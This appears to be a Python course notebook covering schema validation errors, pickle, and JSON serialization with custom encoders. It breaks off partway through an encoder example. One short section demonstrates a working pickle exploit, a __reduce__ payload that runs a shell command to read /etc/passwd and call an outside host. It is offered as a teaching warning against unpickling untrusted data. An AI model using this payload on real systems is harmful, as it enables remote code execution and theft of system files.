    <ipython-input-30-6b77118de8cd> in validate(data, template)
          1 def validate(data, template):
    ----> 2     recurse_validate(data, template, '')
    

    <ipython-input-29-1d5bebf7111c> in recurse_validate(data, template, path)
         11         sub_template = template[key]
         12         sub_data = data[key]
    ---> 13         recurse_validate(sub_data, sub_template, sub_path)
    

    <ipython-input-29-1d5bebf7111c> in recurse_validate(data, template, path)
         11         sub_template = template[key]
         12         sub_data = data[key]
    ---> 13         recurse_validate(sub_data, sub_template, sub_path)
    

    <ipython-input-29-1d5bebf7111c> in recurse_validate(data, template, path)
          1 def recurse_validate(data, template, path):
    ----> 2     match_keys(data, template, path)
          3     match_types(data, template, path)
          4 
          5     # Now see if we have nested dictionaries in template
    

    <ipython-input-27-c6e1757b9457> in match_keys(data, valid, path)
         21                                for key in extra_keys})
         22                      ) if extra_keys else ''
    ---> 23         raise SchemaKeyMismatch(' '.join((missing_msg, extras_msg)))
    

    SchemaKeyMismatch: missing keys:.bio.birthplace.city 



```
validate(michael, template)
```


    ---------------------------------------------------------------------------

    SchemaTypeMismatch                        Traceback (most recent call last)

    <ipython-input-33-c6911eeab1d6> in <module>
    ----> 1 validate(michael, template)
    

    <ipython-input-30-6b77118de8cd> in validate(data, template)
          1 def validate(data, template):
    ----> 2     recurse_validate(data, template, '')
    

    <ipython-input-29-1d5bebf7111c> in recurse_validate(data, template, path)
         11         sub_template = template[key]
         12         sub_data = data[key]
    ---> 13         recurse_validate(sub_data, sub_template, sub_path)
    

    <ipython-input-29-1d5bebf7111c> in recurse_validate(data, template, path)
         11         sub_template = template[key]
         12         sub_data = data[key]
    ---> 13         recurse_validate(sub_data, sub_template, sub_path)
    

    <ipython-input-29-1d5bebf7111c> in recurse_validate(data, template, path)
          1 def recurse_validate(data, template, path):
          2     match_keys(data, template, path)
    ----> 3     match_types(data, template, path)
          4 
          5     # Now see if we have nested dictionaries in template
    

    <ipython-input-28-1e4c559f2e2b> in match_types(data, template, path)
         15                        ' -> expected ' + template_type.__name__ +
         16                        ', found ' + type(data_value).__name__)
    ---> 17             raise SchemaTypeMismatch(err_msg)
    

    SchemaTypeMismatch: incorrect type: .bio.dob.month -> expected int, found str


The nice thing about the way we have structured our exceptions is that we can catch them either as specific `SchemaKeyMismatch` or `SchemaTypeMismatch` exceptions, but also more broadly as `SchemaError` exceptions:


```
try:
    validate(eric, template)
except SchemaError as ex:
    print(ex)
```

    missing keys:.bio.birthplace.city 
    


```
try:
    validate(eric, template)
except SchemaKeyMismatch as ex:
    print('mismatched keys, doing some specific handling for that')
    print(ex)
except SchemaTypeMismatch as ex:
    print('mismatched types, doing some specific handling for that')
    print(ex)
```

    mismatched keys, doing some specific handling for that
    missing keys:.bio.birthplace.city 
    


```
try:
    validate(michael, template)
except SchemaKeyMismatch as ex:
    print('mismatched keys, doing some specific handling for that')
    print(ex)
except SchemaTypeMismatch as ex:
    print('mismatched types, doing some specific handling for that')
    print(ex)
```

    mismatched types, doing some specific handling for that
    incorrect type: .bio.dob.month -> expected int, found str
    

# Section 07 - Serialization and Deserialization

##  Pickling

#### Not Secure!

Pickling is not a secure way to deserialize data objects. **DO NOT** unpickle anything you did not pickle yourself. You have been **WARNED**!

Here's how easy it is to create an exploit.

I am going to pickle an object that is going to use the unix shell (admittedly this will not work on Windows, but it could with some more complicated code - plus I don't need this to run on every machine in the world, just as many as possible - at least that's the mindset if I were a hacker I guess)


```
import os
import pickle


class Exploit():
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt",))


def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)
```

Now, I serialize this code to a file:


```
serialize_exploit('loadme')
```

Now I send this file to some unsuspecting recipients and tell them they just need to load this up in their Python app. They deserialize the pickled object like so:


```
import pickle

pickle.load(open('loadme', 'rb'))
```




    0



And now take a look at your folder that contains this notebook!

#### Pickling Dictionaries

In this part of the course I am only going to discuss pickling basic data types such as numbers, strings, tuples, lists, sets and dictionaries.

In general tuples, lists, sets and dictionaries are all picklable as long as their elements are themselves picklable.

Let's start by serializing some simple data types, such as strings and numbers.

Instead of serializing to a file, I will store the resulting pickle data in a variable, so we can easily inspect it and unpickle it:


```
import pickle
```


```
ser = pickle.dumps('Python Pickled Peppers')
```


```
ser
```




    b'\x80\x03X\x16\x00\x00\x00Python Pickled Peppersq\x00.'



We can deserialize the data this way:


```
deser = pickle.loads(ser)
```


```
deser
```




    'Python Pickled Peppers'



We can do the same thing with numerics:


```
ser = pickle.dumps(3.14)
```


```
ser
```




    b'\x80\x03G@\t\x1e\xb8Q\xeb\x85\x1f.'




```
deser = pickle.loads(ser)
```


```
deser
```




    3.14



We can do the same with lists and tuples:


```
d = [10, 20, ('a', 'b', 30)]
```


```
ser = pickle.dumps(d)
```


```
ser
```




    b'\x80\x03]q\x00(K\nK\x14X\x01\x00\x00\x00aq\x01X\x01\x00\x00\x00bq\x02K\x1e\x87q\x03e.'




```
deser = pickle.loads(ser)
```


```
deser
```




    [10, 20, ('a', 'b', 30)]



Note that the original and the deserialized objects are equal, but not identical:


```
d is deser, d == deser
```




    (False, True)



This works the same way with sets too:


```
s = {'a', 'b', 'x', 10}
```


```
s
```




    {10, 'a', 'b', 'x'}




```
ser = pickle.dumps(s)
print(ser)
```

    b'\x80\x03cbuiltins\nset\nq\x00]q\x01(X\x01\x00\x00\x00aq\x02K\nX\x01\x00\x00\x00xq\x03X\x01\x00\x00\x00bq\x04e\x85q\x05Rq\x06.'
    


```
deser = pickle.loads(ser)
print(deser)
```

    {'a', 10, 'b', 'x'}
    

And finally, we can pickle dictionaries as well:


```
d = {'b': 1, 'a': 2, 'c': {'x': 10, 'y': 20}}
```


```
print(d)
```

    {'b': 1, 'a': 2, 'c': {'x': 10, 'y': 20}}
    


```
ser = pickle.dumps(d)
```


```
ser
```




    b'\x80\x03}q\x00(X\x01\x00\x00\x00bq\x01K\x01X\x01\x00\x00\x00aq\x02K\x02X\x01\x00\x00\x00cq\x03}q\x04(X\x01\x00\x00\x00xq\x05K\nX\x01\x00\x00\x00yq\x06K\x14uu.'




```
deser = pickle.loads(ser)
```


```
print(deser)
```

    {'b': 1, 'a': 2, 'c': {'x': 10, 'y': 20}}
    


```
d == deser
```




    True



What happens if we pickle a dictionary that has two of it's values set to another dictionary?


```
d1 = {'a': 10, 'b': 20}
d2 = {'x': 100, 'y': d1, 'z': d1}
```


```
print(d2)
```

    {'x': 100, 'y': {'a': 10, 'b': 20}, 'z': {'a': 10, 'b': 20}}
    

Let's say we pickle `d2`:


```
ser = pickle.dumps(d2)
```

Now let's unpickle that object:


```
d3 = pickle.loads(ser)
```


```
d3
```




    {'x': 100, 'y': {'a': 10, 'b': 20}, 'z': {'a': 10, 'b': 20}}



That seems to work... Is that sub-dictionary still the same as the original one?


```
d3['y'] == d2['y']
```




    True




```
d3['y'] is d2['y']
```




    False



But consider the original dictionary `d2`: both the `x` and `y` keys referenced the **same** dictionary `d1`:


```
d2['y'] is d2['z']
```




    True



How did this work with our deserialized dictionary?


```
d3['y'] == d3['z']
```




    True



As you can see the relative shared object is maintained.

As you can see our dictionary `d` looks like the earlier one. So, when Python serializes the dictionary, it behaves very similarly to serializing a deep copy of the dictionary. The same thing happens with other collections types such as lists, sets, and tuples.

What this means though is that you have to be very careful how you use serialization and deserialization.

Consider this piece of code:


```
d1 = {'a': 1, 'b': 2}
d2 = {'x': 10, 'y': d1}
print(d1)
print(d2)
d1['c'] = 3
print(d1)
print(d2)
```

    {'a': 1, 'b': 2}
    {'x': 10, 'y': {'a': 1, 'b': 2}}
    {'a': 1, 'b': 2, 'c': 3}
    {'x': 10, 'y': {'a': 1, 'b': 2, 'c': 3}}
    

Now suppose we pickle our dictionaries to restore those values the next time around, but use the same code, expecting the same result:


```
d1 = {'a': 1, 'b': 2}
d2 = {'x': 10, 'y': d1}
d1_ser = pickle.dumps(d1)
d2_ser = pickle.dumps(d2)

# simulate exiting the program, or maybe just restarting the notebook
del d1
del d2

# load the data back up
d1 = pickle.loads(d1_ser)
d2 = pickle.loads(d2_ser)

# and continue processing as before
print(d1)
print(d2)
d1['c'] = 3
print(d1)
print(d2)
```

    {'a': 1, 'b': 2}
    {'x': 10, 'y': {'a': 1, 'b': 2}}
    {'a': 1, 'b': 2, 'c': 3}
    {'x': 10, 'y': {'a': 1, 'b': 2}}
    

So just remember that as soon as you pickle a dictionary, whatever object references it had to another object is essentially lost - just as if you had done a deep copy first. It's a subtle point, but one that can easily lead to bugs if we're not careful.

However, the pickle module is relatively intelligent and will not re-pickle an object it has already pickled - which means that **relative** references are preserved.

Let's see an example of what I mean by this:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    
    def __eq__(self, other):
        return self.name == other.name and self.age == other.age
    
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
```


```
john = Person('John Cleese', 79)
eric = Person('Eric Idle', 75)
michael = Person('Michael Palin', 75)
```


```
parrot_sketch = {
    "title": "Parrot Sketch",
    "actors": [john, michael]
}

ministry_sketch = {
    "title": "Ministry of Silly Walks",
    "actors": [john, michael]
}

joke_sketch = {
    "title": "Funniest Joke in the World",
    "actors": [eric, michael]
}
```


```
fan_favorites = {
    "user_1": [parrot_sketch, joke_sketch],
    "user_2": [parrot_sketch, ministry_sketch]
}
```


```
from pprint import pprint
pprint(fan_favorites)
```

    {'user_1': [{'actors': [Person(name=John Cleese, age=79),
                            Person(name=Michael Palin, age=75)],
                 'title': 'Parrot Sketch'},
                {'actors': [Person(name=Eric Idle, age=75),
                            Person(name=Michael Palin, age=75)],
                 'title': 'Funniest Joke in the World'}],
     'user_2': [{'actors': [Person(name=John Cleese, age=79),
                            Person(name=Michael Palin, age=75)],
                 'title': 'Parrot Sketch'},
                {'actors': [Person(name=John Cleese, age=79),
                            Person(name=Michael Palin, age=75)],
                 'title': 'Ministry of Silly Walks'}]}
    

As you can see we have some shared references, for example:


```
fan_favorites['user_1'][0] is fan_favorites['user_2'][0]
```




    True



Let's store the id of the `parrot_sketch` for later reference:


```
parrot_id_original = id(parrot_sketch)
```

Now let's pickle and unpickle this object:


```
ser = pickle.dumps(fan_favorites)
```


```
new_fan_favorites = pickle.loads(ser)
```


```
fan_favorites == new_fan_favorites
```




    True



And let's look at the `id` of the parrot_sketch object in our new dictionary compared to the original one:


```
id(fan_favorites['user_1'][0]), id(new_fan_favorites['user_1'][0])
```




    (4554999848, 4555001288)



As expected the id's differ - but the objects are equal:


```
fan_favorites['user_1'][0] == new_fan_favorites['user_1'][0]
```




    True



But now let's look at the parrot sketch that is in both `user_1` and `user_2` - remember that originally the objects were identical (`is`):


```
fan_favorites['user_1'][0] is fan_favorites['user_2'][0]
```




    True



and with our new object:


```
new_fan_favorites['user_1'][0] is new_fan_favorites['user_2'][0]
```




    True



As you can see the **relative** relationship between objects that were pickled is **preserved**.

And that's all I'm really going to say about pickling objects in Python. Instead I'm going to focus more on what is probably a more relevant topic to many of you - JSON serialization/deserialization.

##  JSON Serialization

As we saw in the lecture, JSON is an extremely popular format for data interchange. Unlike pickling it is safe, because JSON data is basically just text. It's human readable too, which is a plus.

There are other formats too, such as XML - but XML does not translate directly to Python dictionaries like JSON does. JSON is a far more natural fit with Python - in fact, when we view the contents of a Python dictionary it reminds us of JSON.


```
d = {
    "name": {
        "first": "...",
        "last": "..."
    },
    "contact": {
        "phone": [
            {"type": "...", "number": "..."},
            {"type": "...", "number": "..."},
            {"type": "...", "number": "..."},
        ],
        "email": ["...", "...", "..."]
    },
    "address": {
        "line1": "...",
        "line2": "...",
        "city": "...",
        "country": "..."
    }
}
```

This is a standard Python dictionary, but if you look at the format, it is also technically JSON.

A JSON object contains key/value pairs, nested objects and arrays - just like a Python dictionary. 

The big difference is that JSON is basically just one big string, while a Python dictionary is an object containing other objects.

So the big question when we want to "convert" (serialize) a Python object to JSON is how to **represent** Python objects as **strings**.

Conversely, if we want to load a JSON object into a Python dictionary, how do we "convert" (deserialize) the JSON value strings into a Python object.

By the way this concept of serializing/deserializing is also often called **marshalling**.

JSON has just a few data types it supports:

* **Strings**: must be delimited by double quotes
* **Booleans**: the values `true` and `false`
* **Numbers**: can be integers, or floats (including exponential notation, `1.3E2` for example), but are all considered floats in the standard
* **Arrays**: an **ordered** collection of zero or more items of any valid JSON type
* **Objects**: an **unordered** collection of `key:value` pairs - the keys must be strings (so delimited by double quotes), and the values can be any valid JSON type.
* **NULL**: a null object, denoted by `null` and equivalent to `None` in Python.

This means that the data types supported by JSON are relatively limited - but it turns out, as we'll see later, that it's not really a limitation.

Any object can be serialized into a string (think of the `__repr__` method we've used often throughout this course) - in fact, any piece of information in your computer is a series of bits, as are characters - so theoretically any piece of information can be represented using characters. We'll come back to this in a later video. For now, we're going to stick with the basic data types supported by JSON and see what Python provides us for marshalling JSON.

We are going to use the `json` module:


```
import json
```

In Python, serializing a dictionary to JSON is done using the `dump` and `dumps` functions - they are just variants of the same thing - `dumps` serializes to a string, while `dump` writes the serialization to a file (or more accurately, a stream).

Similarly, the `load` and `loads` functions are used to deserialize JSON into a dictionary.

Let's see a quick example first:


```
d1 = {"a": 100, "b": 200}
```


```
d1_json = json.dumps(d1)
```


```
d1_json, type(d1_json)
```




    ('{"a": 100, "b": 200}', str)



By the way, we can obtain a better looking JSON string by specifying an indent for the `dump` or `dumps` functions:


```
print(json.dumps(d1, indent=2))
```

    {
      "a": 100,
      "b": 200
    }
    

And we can deserialize the JSON string:


```
d2 = json.loads(d1_json)
```


```
d2, type(d2)
```




    ({'a': 100, 'b': 200}, dict)




```
d1 == d2
```




    True



In fact, the original dictionary and the new one are equal.

#### Caveat!

There is a big caveat here. In Python, keys can be any hashable object. But remember that in JSON keys must be strings!


```
d1 = {1: 100, 2: 200}
```


```
d1_json = json.dumps(d1)
```


```
d1_json
```




    '{"1": 100, "2": 200}'



Notice how the keys are now strings in the JSON "object". And when we deserialize:


```
d2 = json.loads(d1_json)
```


```
print(d1)
print(d2)
```

    {1: 100, 2: 200}
    {'1': 100, '2': 200}
    

As you can see our keys are now strings! So be careful, it is **not** true in general that `d == loads(dumps(d))`

Let's just see a few more examples that use the various JSON data types. I'll start with a JSON string this time:


```
d_json = '''
{
    "name": "John Cleese",
    "age": 82,
    "height": 1.96,
    "walksFunny": true,
    "sketches": [
        {
        "title": "Dead Parrot",
        "costars": ["Michael Palin"]
        },
        {
        "title": "Ministry of Silly Walks",
        "costars": ["Michael Palin", "Terry Jones"]
        }
    ],
    "boring": null    
}
'''
```

Let's deserialize this JSON string:


```
d = json.loads(d_json)
```


```
print(d)
```

    {'name': 'John Cleese', 'age': 82, 'height': 1.96, 'walksFunny': True, 'sketches': [{'title': 'Dead Parrot', 'costars': ['Michael Palin']}, {'title': 'Ministry of Silly Walks', 'costars': ['Michael Palin', 'Terry Jones']}], 'boring': None}
    


```
d
```




    {'name': 'John Cleese',
     'age': 82,
     'height': 1.96,
     'walksFunny': True,
     'sketches': [{'title': 'Dead Parrot', 'costars': ['Michael Palin']},
      {'title': 'Ministry of Silly Walks',
       'costars': ['Michael Palin', 'Terry Jones']}],
     'boring': None}



**Important**: The order of the keys *appears* preserved - but JSON objects are an **unordered** collection, so there is no guarantee of this - do not rely on it.

Let's see the various data types in our dictionary:


```
print(d['age'], type(d['age']))
print(d['height'], type(d['height']))
print(d['boring'], type(d['boring']))
print(d['sketches'], type(d['sketches']))
print(d['walksFunny'], type(d['walksFunny']))
print(d['sketches'][0], type(d['sketches'][0]))
```

    82 <class 'int'>
    1.96 <class 'float'>
    None <class 'NoneType'>
    [{'title': 'Dead Parrot', 'costars': ['Michael Palin']}, {'title': 'Ministry of Silly Walks', 'costars': ['Michael Palin', 'Terry Jones']}] <class 'list'>
    True <class 'bool'>
    {'title': 'Dead Parrot', 'costars': ['Michael Palin']} <class 'dict'>
    

As you can see the JSON `array` was serialized into a `list`, `true` was serialized into a `bool`, integer looking values into `int`, float looking values into `float` and sub-objects into `dict`.
As you can see deserializing JSON objects into Python is very straightforward and intuitive.

Let's look at tuples, and see serializing those work:


```
d = {'a': (1, 2, 3)}
```


```
json.dumps(d)
```




    '{"a": [1, 2, 3]}'



So Python tuples are serialized into JSON lists - which again means that if we deserialize the JSON we will not get our exact object back:


```
json.loads(json.dumps(d))
```




    {'a': [1, 2, 3]}



Of course, JSON does not have a notion of tuples as a data type, so this will not work:


```
bad_json = '''
    {"a": (1, 2, 3)}
'''
```


```
json.loads(bad_json)
```


    ---------------------------------------------------------------------------

    JSONDecodeError                           Traceback (most recent call last)

    <ipython-input-24-6c8fecd579d4> in <module>
    ----> 1 json.loads(bad_json)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in loads(s, encoding, cls, object_hook, parse_float, parse_int, parse_constant, object_pairs_hook, **kw)
        352             parse_int is None and parse_float is None and
        353             parse_constant is None and object_pairs_hook is None and not kw):
    --> 354         return _default_decoder.decode(s)
        355     if cls is None:
        356         cls = JSONDecoder
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/decoder.py in decode(self, s, _w)
        337 
        338         """
    --> 339         obj, end = self.raw_decode(s, idx=_w(s, 0).end())
        340         end = _w(s, end).end()
        341         if end != len(s):
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/decoder.py in raw_decode(self, s, idx)
        355             obj, end = self.scan_once(s, idx)
        356         except StopIteration as err:
    --> 357             raise JSONDecodeError("Expecting value", s, err.value) from None
        358         return obj, end
    

    JSONDecodeError: Expecting value: line 2 column 11 (char 11)


We get a `JSONDecodeError` exception. And that's an exception you'll run across quite a bit as you work with JSON data and Python objects!

So, Python was able to serialize a tuple by making it into a JSON array - but what about other data types - like Decimals, Fractions, Complex Numbers, Sets, etc?


```
from decimal import Decimal
json.dumps({'a': Decimal('0.5')})
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-25-1dee51b2b8d4> in <module>
          1 from decimal import Decimal
    ----> 2 json.dumps({'a': Decimal('0.5')})
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in dumps(obj, skipkeys, ensure_ascii, check_circular, allow_nan, cls, indent, separators, default, sort_keys, **kw)
        229         cls is None and indent is None and separators is None and
        230         default is None and not sort_keys and not kw):
    --> 231         return _default_encoder.encode(obj)
        232     if cls is None:
        233         cls = JSONEncoder
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in default(self, o)
        178         """
        179         raise TypeError("Object of type '%s' is not JSON serializable" %
    --> 180                         o.__class__.__name__)
        181 
        182     def encode(self, o):
    

    TypeError: Object of type 'Decimal' is not JSON serializable


So `Decimal` objects are not serializable. Let's see the others as well:


```
try:
    json.dumps({"a": 1+1j})
except TypeError as ex:
    print(ex)
```

    Object of type 'complex' is not JSON serializable
    


```
try:
    json.dumps({"a": {1, 2, 3}})
except TypeError as ex:
    print(ex)
```

    Object of type 'set' is not JSON serializable
    

Now we could get around that problem by looking at the string representation of those objects:


```
str(Decimal(0.5))
```




    '0.5'




```
json.dumps({"a": str(Decimal(0.5))})
```




    '{"a": "0.5"}'



But as you can see from the JSON, when we read that data back, we will get the **string** `0.5` back, not even a float!

How about our own objects? As long as they have a string representation we should be fine, or will we?


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
```


```
p = Person('John', 82)
```


```
p
```




    Person(name=John, age=82)




```
json.dumps({"john": p})
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-33-2438cb71591a> in <module>
    ----> 1 json.dumps({"john": p})
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in dumps(obj, skipkeys, ensure_ascii, check_circular, allow_nan, cls, indent, separators, default, sort_keys, **kw)
        229         cls is None and indent is None and separators is None and
        230         default is None and not sort_keys and not kw):
    --> 231         return _default_encoder.encode(obj)
        232     if cls is None:
        233         cls = JSONEncoder
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in default(self, o)
        178         """
        179         raise TypeError("Object of type '%s' is not JSON serializable" %
    --> 180                         o.__class__.__name__)
        181 
        182     def encode(self, o):
    

    TypeError: Object of type 'Person' is not JSON serializable


So no luck there either. One approach is to write a custom JSON serializer in our class itself, and use that when we serialize the object:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return dict(name=self.name, age=self.age)
```


```
p = Person('John', 82)
```


```
p.toJSON()
```




    {'name': 'John', 'age': 82}



And now we can serialize it as follows:


```
print(json.dumps({"john": p.toJSON()}, indent=2))
```

    {
      "john": {
        "name": "John",
        "age": 82
      }
    }
    

In fact, often we can make our life a little easier by using the `vars` function (or the `__dict__` attribute) to return a dictionary of our object attributes:


```
vars(p)
```




    {'name': 'John', 'age': 82}




```
p.__dict__
```




    {'name': 'John', 'age': 82}




```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return vars(self)
```


```
json.dumps(dict(john=p.toJSON()))
```




    '{"john": {"name": "John", "age": 82}}'



How about dealing with sets, where we do not control the class definition:


```
s = {1, 2, 3}
```

We can't use the string representation (it has curly braces), and there's nothing else really handy - but we could just convert it to a list:


```
json.dumps(dict(a=list({1, 2, 3})))
```




    '{"a": [1, 2, 3]}'



There are a couple of glaring issues at this point:
1. we have to remember to call `.toJSON()` for our custom objects
2. what about built-in or standard types like sets, or dates? use built-in or write custom functions to convert and call them every time?

There has to be a better way... !

##  Custom JSON Serialization

As we saw in the previous video, certain data types cannot be serialized to JSON using Python's defaults. 
Here's a simple example of this:


```
from datetime import datetime
```


```
current = datetime.utcnow()
```


```
current
```




    datetime.datetime(2018, 12, 29, 22, 26, 35, 671836)



As we can see, this is a `datetime` object.

Now let's try to serialize it to JSON:


```
import json
```


```
json.dumps(current)
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-5-b203d3dbab0a> in <module>
    ----> 1 json.dumps(current)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in dumps(obj, skipkeys, ensure_ascii, check_circular, allow_nan, cls, indent, separators, default, sort_keys, **kw)
        229         cls is None and indent is None and separators is None and
        230         default is None and not sort_keys and not kw):
    --> 231         return _default_encoder.encode(obj)
        232     if cls is None:
        233         cls = JSONEncoder
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in default(self, o)
        178         """
        179         raise TypeError("Object of type '%s' is not JSON serializable" %
    --> 180                         o.__class__.__name__)
        181 
        182     def encode(self, o):
    

    TypeError: Object of type 'datetime' is not JSON serializable


As we can see Python raises a `TypeError` exception, stating that `datetime` objects are not JSON serializable.

So, we'll need to come up with our own serialization format.

For datetimes, the most common format is the **ISO 8601** format - you can read up more about it here (https://en.wikipedia.org/wiki/ISO_8601), but basically the format is:

*YYYY-MM-DD* **T** *HH:MM:SS*

There are some variations for encoding timezones, but to keep things simple I am going to use timezone naive timestamps, and just use UTC everywhere.

We could use Python's string representation for datetimes:


```
str(current)
```




    '2018-12-29 22:26:35.671836'



but this is not quite ISO-8601. We could write a custom formatter ourselves:


```
def format_iso(dt):
    return dt.strftime('%Y-%m-%dT%H:%M:%S')
```

(If you want more info and options on date and time formatting/parsing using `strftime` and `strptime`, which essentially pass through to their `C` counterparts, you can see the Python docs here: https://docs.python.org/3/library/datetime.html#strftime-strptime-behavior)


```
format_iso(current)
```




    '2018-12-29T22:26:35'



But Python actually provides us a function to do the same:


```
current.isoformat()
```




    '2018-12-29T22:26:35.671836'



This is almost identical to our custom representation, but also includes fractional seconds. If you don't want fractional seconds in your representation, then you'll have to write some custom code like the one above.
I'm just going to use Python's ISO-8601 representation.
And now let's serialize our `datetime` object to JSON:


```
log_record = {'time': datetime.utcnow().isoformat(), 'message': 'testing'}
```


```
json.dumps(log_record)
```




    '{"time": "2018-12-29T22:26:42.083020", "message": "testing"}'



OK, this works, but this is far from ideal. Normally, our dictionary will contain the `datetime` object, not it's string representation.

For example, in the example I showed above, our record would likely be:


```
log_record = {'time': datetime.utcnow(), 'message': 'testing'}
```

The problem is that `log_record` is now not JSON serializable!

What we have to do is write custom code to replace non-JSON serializable objects in our dictionary with custom representations. This can quickly become tedious and unmanageable if we deal with many dictionaries, and arbitrary structures.

Fortunately, Python's `dump` and `dumps` functions have some ways for us to define general serializations for non-standard JSON objects.

The simplest way is to specify a function that `dump`/`dumps` will call when it encounters something it cannot serialize:


```
def format_iso(dt):
    return dt.isoformat()
```


```
json.dumps(log_record, default=format_iso)
```




    '{"time": "2018-12-29T22:26:42.532485", "message": "testing"}'



This will work even if we have more than one date in our dictionary:


```
log_record = {
    'time1': datetime.utcnow(),
    'time2': datetime.utcnow(),
    'message': 'Testing...'
}
```


```
json.dumps(log_record, default=format_iso)
```




    '{"time1": "2018-12-29T22:26:43.296170", "time2": "2018-12-29T22:26:43.296171", "message": "Testing..."}'



So this works, but what happens if we introduce another non-serializable object:


```
log_record = {
    'time': datetime.utcnow(),
    'message': 'Testing...',
    'other': {'a', 'b', 'c'}
}
```


```
json.dumps(log_record, default=format_iso)
```


    ---------------------------------------------------------------------------

    AttributeError                            Traceback (most recent call last)

    <ipython-input-18-0e97ab60a7d9> in <module>
    ----> 1 json.dumps(log_record, default=format_iso)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in dumps(obj, skipkeys, ensure_ascii, check_circular, allow_nan, cls, indent, separators, default, sort_keys, **kw)
        236         check_circular=check_circular, allow_nan=allow_nan, indent=indent,
        237         separators=separators, default=default, sort_keys=sort_keys,
    --> 238         **kw).encode(obj)
        239 
        240 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    <ipython-input-13-ed6e95a9fae9> in format_iso(dt)
          1 def format_iso(dt):
    ----> 2     return dt.isoformat()
    

    AttributeError: 'set' object has no attribute 'isoformat'


As you can see, Python encountered that `set`, and therefore called the `default` callable - but that callable was not designed to handle sets, and so we end up with an exception in the `format_iso` callable instead.

We can remedy this by essentially adding code to our function to make it handle various data types. Essentially creating a dispatcher - this should remind you of the single-dispatch generic function decorator available in the `functools` module which we discussed in an earlier part of this series. You can also view more info about it here: https://docs.python.org/3/library/functools.html#functools.singledispatch


Let's first write it without the decorator to make sure we have our code correct:


```
def custom_json_formatter(arg):
    if isinstance(arg, datetime):
        return arg.isoformat()
    elif isinstance(arg, set):
        return list(arg)
```


```
json.dumps(log_record, default=custom_json_formatter)
```




    '{"time": "2018-12-29T22:26:43.760863", "message": "Testing...", "other": ["c", "a", "b"]}'



To make things a little more interesting, let's throw in a custom object as well:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.create_dt = datetime.utcnow()
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return {
            'name': self.name,
            'age': self.age,
            'create_dt': self.create_dt.isoformat()
        }
```


```
p = Person('John', 82)
print(p)
print(p.toJSON())
```

    Person(name=John, age=82)
    {'name': 'John', 'age': 82, 'create_dt': '2018-12-29T22:26:45.066252'}
    

And we modify our custom JSON formatter as follows:


```
def custom_json_formatter(arg):
